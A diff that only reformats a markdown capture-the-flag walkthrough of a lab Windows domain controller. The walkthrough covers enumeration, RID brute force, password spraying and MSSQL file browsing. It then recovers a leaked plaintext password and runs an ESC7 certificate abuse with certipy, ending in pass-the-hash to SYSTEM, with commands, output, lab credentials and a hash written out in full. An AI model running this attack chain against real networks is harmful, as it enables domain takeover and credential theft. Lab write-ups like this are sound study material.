@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```bash
 nmap -sV -sC -vvv 10.10.11.236
 nmap -sU --top-ports=10 -vv 10.10.236
 
@@ -207,11 +207,11 @@ Host script results:
 123/udp  open          ntp          udp-response ttl 127
 
 ```
-	- SQL, Kerberos, HTTP, SMB, LDAP
+- SQL, Kerberos, HTTP, SMB, LDAP
 ## Directory Enumeration
 - Gobuster:
-	- Directory
-		```bash
+- Directory
+```bash
 gobuster dir -u http://10.10.11.236 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -224,8 +224,8 @@ gobuster dir -u http://10.10.11.236 dns --wordlist /usr/share/wordlists/dirbuste
 /JS                   (Status: 301) [Size: 146] [--> http://10.10.11.236/JS/]
 
 ```
-		- Next Directory
-			```bash
+- Next Directory
+```bash
 gobuster dir -u http://10.10.11.236/images dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x png
 
 ---OUTPUT---
@@ -248,21 +248,21 @@ gobuster dir -u http://10.10.11.236/images dns --wordlist /usr/share/wordlists/d
 /Call.png             (Status: 200) [Size: 1156]
 
 ```
-	- VHost
-		```bash
+- VHost
+```bash
 gobuster vhost
 ```
 - Ffuf gives nothing of value (had to limit size as everything was responding OK)
 
 - Dirsearch
-	```bash
+```bash
 dirsearch -u
 ```
 - Dirbuster
-	- 
+- 
 ## SMB Enumeration
 - We pass the command:
-	```bash
+```bash
 smbclient -U '' -L 10.10.11.236
 
 ---OUTPUT---
@@ -279,11 +279,11 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-	- All default shares
+- All default shares
 - We pass the same with crackmapexec, to see permissions:
-	- only guest credentials worked
-		- others connected but guest:guest was rejected
-	```bash
+- only guest credentials worked
+- others connected but guest:guest was rejected
+```bash
 crackmapexec smb 10.10.11.236 -u 'guest' -p '' --shares
 
 ---OUTPUT---
@@ -302,14 +302,14 @@ SMB         10.10.11.236    445    DC01             SYSVOL                      
 - 
 ### Direct
 - 10.10.10.236 : manager website.
-	- Can send a message under Contact
-	- Images lead to /image/image_name.png
+- Can send a message under Contact
+- Images lead to /image/image_name.png
 - 10.10.11.236/images
 	![[Pasted image 20250414215037.png]]
-		- IIS Error message
+- IIS Error message
 ## RID Bruteforce
 - We canbrute force relative identifiers to enumerate possible users:
-	```bash
+```bash
 netexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
 
 --OR--
@@ -390,9 +390,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 1118: MANAGER\ChinHae (SidTypeUser)
 1119: MANAGER\Operator (SidTypeUser)
 ```
-	- How does this work? (**EXPLAINED IN THE BOTTOM**)
-	- We copy the data to a file ( I copied the second one as it's more clean)
-		```bash
+- How does this work? (**EXPLAINED IN THE BOTTOM**)
+- We copy the data to a file ( I copied the second one as it's more clean)
+```bash
 vi rid.brute # copy contents here
 cat rid.brute | grep "User" | awk '{print $2}'
 cat rid.brute | grep "User" | awk '{print $2}'| awk -F\\ '{print$2}'| sort -u | grep -v '\$$' # remove ending with $ as machine accounts
@@ -429,9 +429,9 @@ SQLServer2005SQLBrowserUser$DC01
 Zhong
 
 ```
-		- save it to a file
-			- We need the lowercase of this file too:
-				```bash
+- save it to a file
+- We need the lowercase of this file too:
+```bash
 cat user.txt | tr '[:upper:]' '[:lower:]'
 cat user.txt | tr '[:upper:]' '[:lower:]' >>user.txt
 cat user.txt
@@ -480,8 +480,8 @@ sqlserver2005sqlbrowseruser$dc01
 zhong
 ```
 - **ALTERNATE METHOD**
-	- we could instead bruteforce with kerbrute to find users:
-		```bash
+- we could instead bruteforce with kerbrute to find users:
+```bash
 sudo ./kerbrute_linux_amd64 userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
 ---OUTPUT---
@@ -506,12 +506,12 @@ Version: dev (9cfb81e) - 04/15/25 - Ronnie Flathers @ropnop
 2025/04/15 00:12:21 >  [+] VALID USERNAME:       operator@manager.htb
 
 ```
-	- we grab the usernames from this to make a user list
-		- since its all in lowercase it works better
-		- However this is not the intended method 
-	- How it works? **Explanation at the bottom**
+- we grab the usernames from this to make a user list
+- since its all in lowercase it works better
+- However this is not the intended method 
+- How it works? **Explanation at the bottom**
 - Then we bruteforce each user with its own usrname as the password (`--no-bruteforce` agument in netexec(crackmapexec))
-	```bash
+```bash
 netexec smb 10.10.11.236 -u user.txt -p user.txt --no-bruteforce --continue-on-success       
 
 ---OUTPUT---
@@ -542,22 +542,22 @@ SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven 
 SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
 SMB         10.10.11.236    445    DC01             [+] manager.htb\sqlserver2005sqlbrowseruser$dc01:sq
 ```
-	- `Domain:Domain`
-	- `Protected:Protected`
-	- `SQLServer2005SQLBrowserUser$DC01:SQLServer2005SQLBrowserUser$DC01`
-	- `operator:operator`
+- `Domain:Domain`
+- `Protected:Protected`
+- `SQLServer2005SQLBrowserUser$DC01:SQLServer2005SQLBrowserUser$DC01`
+- `operator:operator`
 
 - We test with netexec
-	- We try all but operator works with mssql:
-	```bash
+- We try all but operator works with mssql:
+```bash
 netexec mssql 10.10.11.236 -u 'operator' -p 'operator'
 
 ---OUTPUT---
 MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
 MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator 
 ```
-	- We attempt to login with these credentials:
-		```bash
+- We attempt to login with these credentials:
+```bash
 impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 > help
 
@@ -583,13 +583,13 @@ lcd {path}                 - changes the current local directory to {path}
     mask_query                 - mask query
 
 ```
-	- We see some bash commands:
-		- enable_xp_cmdshell = denied permission
-		- xp_cmdshell
-		- xp_dirtree
-	- using xp_dirtree we can enumerate the target
-		- On doing so we find we can access the website files at inetpub
-		```bash
+- We see some bash commands:
+- enable_xp_cmdshell = denied permission
+- xp_cmdshell
+- xp_dirtree
+- using xp_dirtree we can enumerate the target
+- On doing so we find we can access the website files at inetpub
+```bash
 xp_dirtree C:\
 xp_dirtree C:\inetpub
 xp_dirtree C:\inetpub\wwwroot
@@ -615,17 +615,17 @@ web.config                            1      1
 
 website-backup-27-07-23-old.zip       1      1   
 ```
-	- We see the webite holds a backup zip file so we grab it from the url
+- We see the webite holds a backup zip file so we grab it from the url
 - We extract the zip file:
-	```bash
+```bash
 unzip website-backup-27-07-23-old.zip
 ls -al
 
 ---MAIN-OUTPUT---
 -rw-rw-r--  1 kali kali     698 Jul 27  2023 .old-conf.xml
 ```
-	- We read the file and find credentials:
-		```bash
+- We read the file and find credentials:
+```bash
 cat .old-conf.xml
 
 ---OUTPUT---
@@ -650,15 +650,15 @@ cat .old-conf.xml
    </search>
 </ldap-conf>
 ```
-	- Can check with SMB (but we don't find any new shares)
+- Can check with SMB (but we don't find any new shares)
 - We can evil-winrm to the machine and grab the user flag
-	```bash
+```bash
 evil-winrm -u Raven -p 'R4v3nBe5tD3veloP3r!123' -i  10.10.11.236
 ```
 
 ## Privilege Escalation
 - We use certipy to check for vulnerabilities:
-	```bash
+```bash
 certipy find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target 10.10.11.236 -stdout -vulnerable
 
 ---OUTPUT---
@@ -702,17 +702,17 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate templates
 
 ```
-	- ESC7
+- ESC7
 - On searching google we find a way to exploit
-	- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-authority-esc7
-	- https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/
+- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-authority-esc7
+- https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/
 - the second link provides the main exploitation method but we need the first link for satisfying the prerequisites.
-	- we need to give our user the right permissions (and the ability to get those permission)
-		- must have **Manage Certificate Authority (CA)** access right.
-		- **Manage Certificates** access right (with Manage Certificate Authority access right we can grant ourselves this right)
-	- Enable SubCA certificate template
+- we need to give our user the right permissions (and the ability to get those permission)
+- must have **Manage Certificate Authority (CA)** access right.
+- **Manage Certificates** access right (with Manage Certificate Authority access right we can grant ourselves this right)
+- Enable SubCA certificate template
 - We add our user as an officer to get the permissions we need:
-	```bash
+```bash
 # Add new officer
 certipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven
 
@@ -750,8 +750,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully enabled 'SubCA' on 'manager-DC01-CA
 ```
 - Then we can begin our exploit (link 2)
-	- Request a certificate (will fail but we will get it saved)
-		```bash
+- Request a certificate (will fail but we will get it saved)
+```bash
 certipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -upn administrator@manager.htb
 
 ---OUTPUT---
@@ -764,8 +764,8 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 24.key
 [-] Failed to request certificate
 ```
-	- Now we can issue this certificate (Do note I think if we are too slow it may fail)
-		```bash
+- Now we can issue this certificate (Do note I think if we are too slow it may fail)
+```bash
 ertipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -issue-request 24
 
 ---OUTPUT---
@@ -773,8 +773,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-	- Now we can retrieve the certiicate:
-		```bash
+- Now we can retrieve the certiicate:
+```bash
 ertipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -upn administrator@manager.htb -retrieve 24
 
 ---OUTPUT---
@@ -787,8 +787,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '24.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-	- And finally we can authenticate using this certificate to retrieve the hash
-		```bash
+- And finally we can authenticate using this certificate to retrieve the hash
+```bash
 certipy auth -pfx administrator.pfx
 
 ---OUTPUT-FAIL---
@@ -798,13 +798,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to get TGT...
 [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
-		- We see clock skew too great as is common with kerberos
-			- We sync our clock with the target
-				```bash
+- We see clock skew too great as is common with kerberos
+- We sync our clock with the target
+```bash
 sudo ntpdate 10.10.11.236
 ```
-	- We issue the certificate again :
-		```bash
+- We issue the certificate again :
+```bash
 
 certipy auth -pfx administrator.pfx
 
@@ -816,8 +816,8 @@ certipy auth -pfx administrator.pfx
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
 ```
-	- We retrieve the hash, which we can use to login as administrator using pass-the-hash via psexec
-		```bash
+- We retrieve the hash, which we can use to login as administrator using pass-the-hash via psexec
+```bash
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef administrator@10.10.11.236
 
 ---OUTPUT---
@@ -842,7 +842,7 @@ nt authority\system
 --------
 ## How RID Bruteforcing with netexec works
 - Using rpcclient:
-	```bash
+```bash
 rpcclient 10.10.11.236 -u 'guest%' # to seperate username from password
 > lookupnames administrator
 > lookupsids
@@ -850,24 +850,24 @@ rpcclient 10.10.11.236 -u 'guest%' # to seperate username from password
 administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
 					#                                  - <user_sid>
 ```
-	- We get SID
-		- 500 is admin sid
-	- We can also do :
-		```bash
+- We get SID
+- 500 is admin sid
+- We can also do :
+```bash
 > lookupsids S-1-5-21-4078382237-1492182817-2568127209-500
 
 ---OUTPUT---
 S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1
 ```
 - User accounts usually start at 1000:
-	```bash
+```bash
 > lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
 
 ---OUTPUT---
 S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1)
 ```
 - What netexec is doing is bruteforcing this to find accounts:
-	```bash
+```bash
 rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
 ----
 S-1-5-21-4078382237-1492182817-2568127209-1000 MANAGER\DC01$ (1) # machine account
@@ -894,8 +894,8 @@ S-1-5-21-4078382237-1492182817-2568127209-512 MANAGER\Domain Admins (2)
 ```
 ## How Kerbrute userenum works
 - Basically when we authenticate with a correct user the error message is different that from a wrong user in Kerberos
-	- default accounts act a bit differently
-	```bash
+- default accounts act a bit differently
+```bash
 netexec smb/mssql 10.10.11.236 -k -u 'ryan' -p ''
 netexec smb/mssql 10.10.11.236 -k -u 'rocknrj' -p ''
 netexec smb/mssql 10.10.11.236 -k -u 'guest' -p ''
